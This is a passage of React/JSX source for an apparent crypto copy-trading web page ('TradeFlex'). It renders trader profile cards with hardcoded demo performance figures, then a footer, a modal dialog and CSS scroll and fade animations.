                earn={29876.54}
                roi={37.8}
                winRate={92.67}
                aum={134567}
                sharpe={3.12}
                isCopying={isCopyingTrader("Bull Run Queen")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Bull Run Queen"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/78.jpg"
                name="Sideways Sam"
                followers="234/1000"
                isVip={false}
                earn={6543.21}
                roi={13.4}
                winRate={78.92}
                aum={34567}
                sharpe={1.34}
                isCopying={isCopyingTrader("Sideways Sam")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Sideways Sam"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/12.jpg"
                name="Volatility Vixen"
                followers="456/1000"
                isVip={true}
                earn={18765.43}
                roi={26.7}
                winRate={87.45}
                aum={76543}
                sharpe={2.23}
                isCopying={isCopyingTrader("Volatility Vixen")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Volatility Vixen"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/56.jpg"
                name="Liquidity Lord"
                followers="789/1000"
                isVip={true}
                earn={32345.67}
                roi={39.1}
                winRate={93.78}
                aum={145678}
                sharpe={3.45}
                isCopying={isCopyingTrader("Liquidity Lord")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Liquidity Lord"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/34.jpg"
                name="Gas Fee Guru"
                followers="234/1000"
                isVip={false}
                earn={7654.32}
                roi={17.6}
                winRate={82.34}
                aum={45678}
                sharpe={1.67}
                isCopying={isCopyingTrader("Gas Fee Guru")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Gas Fee Guru"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/89.jpg"
                name="Smart Contract Sam"
                followers="567/1000"
                isVip={true}
                earn={23456.78}
                roi={28.9}
                winRate={88.91}
                aum={98765}
                sharpe={2.56}
                isCopying={isCopyingTrader("Smart Contract Sam")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Smart Contract Sam"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/67.jpg"
                name="Yield Farmer"
                followers="345/1000"
                isVip={false}
                earn={9876.54}
                roi={21.3}
                winRate={85.67}
                aum={56789}
                sharpe={1.89}
                isCopying={isCopyingTrader("Yield Farmer")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Yield Farmer"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/23.jpg"
                name="NFT Ninja"
                followers="678/1000"
                isVip={true}
                earn={27654.32}
                roi={32.4}
                winRate={90.12}
                aum={112345}
                sharpe={2.78}
                isCopying={isCopyingTrader("NFT Ninja")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "NFT Ninja"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/45.jpg"
                name="Metaverse Master"
                followers="456/1000"
                isVip={true}
                earn={19876.54}
                roi={25.8}
                winRate={86.45}
                aum={87654}
                sharpe={2.34}
                isCopying={isCopyingTrader("Metaverse Master")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Metaverse Master"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/men/78.jpg"
                name="Layer 2 Legend"
                followers="234/1000"
                isVip={false}
                earn={6543.21}
                roi={14.7}
                winRate={80.23}
                aum={34567}
                sharpe={1.45}
                isCopying={isCopyingTrader("Layer 2 Legend")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Layer 2 Legend"}
              />
              <ProTraderCard
                avatar="https://randomuser.me/api/portraits/women/12.jpg"
                name="Cross Chain Queen"
                followers="789/1000"
                isVip={true}
                earn={31234.56}
                roi={36.2}
                winRate={91.89}
                aum={134567}
                sharpe={3.23}
                isCopying={isCopyingTrader("Cross Chain Queen")}
                onCopyTrade={handleCopyTrade}
                onStopCopyTrade={toggleCopyTrading}
                isProcessing={processingTrader === "Cross Chain Queen"}
              />
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 border-t border-blue-900/40 py-8">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <p className="text-white/40">
            © 2025 TradeFlex. All Rights Reserved.
          </p>
        </div>
      </footer>

      <ModalDialog
        open={modalOpen}
        onClose={() => setModalOpen(false)}
        mode={modalMode}
        title={modalTitle}
        message={modalMessage}
      />
    </div>
  );
}

// CSS for animations
const styles = `
@keyframes scroll {
  0% { transform: translateX(0); }
  100% { transform: translateX(-50%); }
}

.animate-scroll {
  animation: scroll 30s linear infinite;
}

@keyframes fadeIn {
  from { opacity: 0; transform: scale(0.9); }
  to { opacity: 1; transform: scale(1); }
}

.animate-fadeIn {
  animation: fadeIn 0.3s ease-out;
}
`;
